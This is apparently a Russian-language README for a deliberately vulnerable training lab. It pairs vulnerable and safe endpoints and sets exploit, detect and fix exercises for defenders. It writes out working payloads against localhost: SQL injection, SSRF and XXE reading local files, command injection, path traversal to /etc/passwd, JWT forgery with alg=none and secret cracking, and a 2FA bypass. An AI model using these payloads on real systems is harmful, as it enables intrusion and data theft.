# vuln-hub — девять классов уязвимостей в одном стенде

Приложение на Python stdlib (без pip-зависимостей), в котором каждый класс
уязвимости представлен **парой эндпоинтов**: уязвимым и безопасным.
Это главный стенд для сквозных заданий: «эксплуатируй → задетектируй → почини →
перепроверь».

```bash
cd labs/setup && docker compose up -d vuln-hub
# или без Docker:
DB_PATH=/tmp/vh.db DOCS_DIR=labs/web-labs/vuln-hub/docs PORT=8090 \
  python3 labs/web-labs/vuln-hub/app.py
```

URL: http://localhost:8090

## Карта эндпоинтов

| Класс | Уязвимый | Безопасный | Что именно сломано |
|-------|----------|------------|--------------------|
| SQLi | `/items?id=` | `/items_safe?id=` | конкатенация в `WHERE` |
| IDOR | `/notes?id=` | `/notes_safe?id=` | нет проверки владельца |
| XSS | `/echo?q=` | `/echo_safe?q=` | вывод без экранирования |
| SSRF | `/fetch?url=` | `/fetch_safe?url=` | нет whitelist схем/хостов, разрешён `file://` |
| XXE | `POST /lookup` | `POST /lookup_safe` | обработка DTD и внешних сущностей |
| CMDi | `/ping?host=` | `/ping_safe?host=` | `shell=True` с вводом пользователя |
| LFI | `/read?file=` | `/read_safe?file=` | путь из параметра без нормализации |
| JWT | `POST /login`, `/me`, `/admin` | `POST /login_safe`, `/me_safe` | `alg` из токена, `none`, слабый секрет |
| 2FA | `POST /verify` | `POST /verify_safe` | флаг прохождения присылает клиент |

Служебные: `/health`, `/jwks` («публичный ключ» для задания на algorithm
confusion), `/logs` (JSON-журнал запросов для заданий по детектированию).

Учётные данные стенда: `admin / admin123`, `guest / guest`.
Секрет подписи JWT: `secret` — он есть в `wordlists/passwords/jwt-secrets.txt`,
чтобы задание на подбор было воспроизводимым. Учебный код 2FA: `123456`.

## Контракт поведения: selftest

```bash
python3 labs/web-labs/vuln-hub/selftest.py            # 30 проверок
python3 labs/web-labs/vuln-hub/selftest.py --base-url http://localhost:8090
```

`selftest.py` проверяет **обе** ветки каждого класса: уязвимая должна
«сломаться», безопасная — выстоять. Это регрессионный контракт лаборатории:
если safe-ветка начала пропускать атаку, задания теряют смысл, и тест падает.
Прогоняется в CI (`.github/workflows/lab-tests.yml`).

## Задания

### 1. SQLi (три канала подтверждения)

```bash
python3 tools/lib/http_fetch.py "http://localhost:8090/items?id=1'" 6 GET          # ошибка
python3 tools/lib/http_fetch.py "http://localhost:8090/items?id=1%20AND%201%3D1" 6 GET
python3 tools/lib/http_fetch.py "http://localhost:8090/items?id=1%20AND%201%3D2" 6 GET
python3 tools/lib/http_fetch.py "http://localhost:8090/items?id=-1%20UNION%20SELECT%201,name,3,secret_note%20FROM%20items--%20" 6 GET
```

Критерий: ошибка СУБД видна клиенту, `1=1` и `1=2` дают разные ответы,
UNION читает `secret_note`.

### 2. IDOR и одинаковый ответ

Прочитайте заметки 1, 2, 3 от имени `guest` через `/notes?id=` и через
`/notes_safe?id=`. Объясните, почему безопасная ветка обязана возвращать
**одинаковый** ответ для «нет прав» и «не существует» (иначе получается oracle
для перебора идентификаторов).

### 3. XSS в трёх контекстах

`/echo` отражает значение в теле HTML. Найдите, где в приложении есть вывод
в атрибут и в JS-контекст (подсказка: смотрите `app.py`), и подберите вектор
для каждого. Сравните с `/echo_safe`.

### 4. SSRF: внутренний сервис и file://

```bash
python3 tools/lib/http_fetch.py "http://localhost:8090/fetch?url=http%3A%2F%2F127.0.0.1%3A8090%2Fhealth" 6 GET
python3 tools/lib/http_fetch.py "http://localhost:8090/fetch?url=file%3A%2F%2F%2Fetc%2Fhostname" 6 GET
python3 tools/lib/http_fetch.py "http://localhost:8090/fetch_safe?url=http%3A%2F%2F127.0.0.1%3A8090%2Fhealth" 6 GET
```

Объясните три меры в `fetch_safe`: whitelist хостов, разрешение только
`http/https`, резолв DNS с проверкой приватных диапазонов. Какая из них
защищает от DNS rebinding, а какая — нет?

### 5. XXE

```bash
python3 tools/lib/http_fetch.py http://localhost:8090/lookup 6 POST \
  '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><root>&x;</root>'
python3 tools/lib/http_fetch.py http://localhost:8090/lookup_safe 6 POST \
  '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><root>&x;</root>'
```

Критерий: в уязвимой ветке значение сущности подставляется в документ,
в безопасной — `DOCTYPE is not allowed`.

### 6. Command injection

```bash
python3 tools/lib/http_fetch.py "http://localhost:8090/ping?host=127.0.0.1%3B%20id" 6 GET
python3 tools/lib/http_fetch.py "http://localhost:8090/ping?host=127.0.0.1%0Aid" 6 GET
python3 tools/lib/http_fetch.py "http://localhost:8090/ping_safe?host=127.0.0.1%3B%20id" 6 GET
```

Найдите в выводе `uid=`. Объясните, почему `ping_safe` использует массив
аргументов и whitelist символов, а не «фильтр опасных слов».

### 7. LFI

```bash
python3 tools/lib/http_fetch.py "http://localhost:8090/read?file=../../../../etc/passwd" 6 GET
python3 tools/lib/http_fetch.py "http://localhost:8090/read_safe?file=../../../../etc/passwd" 6 GET
python3 tools/lib/http_fetch.py "http://localhost:8090/read_safe?file=readme.txt" 6 GET
```

### 8. JWT: три атаки подряд

```bash
# 1. легальный вход
python3 tools/lib/http_fetch.py http://localhost:8090/login 6 POST "login=guest&password=guest"

# 2. подбор слабого секрета (офлайн)
hashcat -m 16500 token.txt wordlists/passwords/jwt-secrets.txt   # или jwt_tool -C -d

# 3. подделка роли и alg=none — см. selftest.forge_token()
python3 - <<'PY'
import sys; sys.path.insert(0, "labs/web-labs/vuln-hub")
from selftest import forge_token, fetch
print(fetch("http://localhost:8090", "/admin", token=forge_token())[:200])
print(fetch("http://localhost:8090", "/admin", token=forge_token(alg="none"))[:200])
print(fetch("http://localhost:8090", "/me_safe", token=forge_token(alg="none"))[:200])
PY
```

Критерий: `/admin` пускает подделанный токен, `/me_safe` — отклоняет.
Сформулируйте, какие три проверки обязаны быть в валидаторе JWT
(allowlist алгоритмов, проверка подписи до чтения claims, валидация `exp/iss/aud`).

### 9. 2FA

```bash
python3 tools/lib/http_fetch.py http://localhost:8090/verify 6 POST "token=<TOKEN>&mfa_passed=1"
python3 tools/lib/http_fetch.py http://localhost:8090/verify_safe 6 POST "token=<TOKEN>&mfa_passed=1"
```

Объясните, почему «флаг пройденной 2FA» обязан жить только на сервере и быть
привязанным к сессии, а одноразовый код — инвалидироваться после первой проверки.

### 10. Детектирование (связка с главой 7)

```bash
python3 tools/lib/http_fetch.py http://localhost:8090/logs
```

Журнал содержит метод, путь, query-строку, статус и User-Agent. Задание:
написать по одному правилу (Sigma или grep-эвристика) на каждый класс атак
из пунктов 1–9 и проверить их на этом журнале. Начните с трёх:

* запрос к `/items` с `UNION`/`--` в query и статусом 500;
* запрос к `/read` с `../` в параметре;
* запрос к `/admin` без предшествующего успешного `/verify` (обход 2FA).

### 11. Починить всё

Переведите уязвимые ветки на безопасные реализации (образцы — `_safe`-функции
в том же файле) и добейтесь, чтобы `selftest.py` показывал FAIL для уязвимых
проверок и PASS для безопасных. Затем обсудите: какие из мер дешевы
(экранирование, параметризация), а какие требуют архитектурных решений
(egress-фильтрация для SSRF, серверная машина состояний для 2FA).

## Автоматические тесты

```bash
python3 labs/web-labs/vuln-hub/selftest.py              # контракт: 30 проверок
tools/payload-tester.sh --lab vuln-hub                  # карточки против стенда
tools/payload-tester.sh --lab vuln-hub --list
```

Карточки, привязанные к этому стенду (`lab: labs/web-labs/vuln-hub`),
проверяются автоматически; карточки с `tester: manual` (подделка JWT, 2FA,
IDOR) помечаются как SKIP — их проверяют заданиями выше.

## Артефакты для разбора

* `payloads/web/sqli/` · `payloads/web/xss/` · `payloads/web/lfi-rfi/`
* `payloads/web/ssrf/` · `payloads/web/xxe/` · `payloads/web/cmdi/`
* `payloads/web/auth-bypass/jwt-*.md`, `idor-sequential-ids.md`, `2fa-bypass-classic.md`
* глава 7 — детектирование, глава 8 — чек-листы ревью
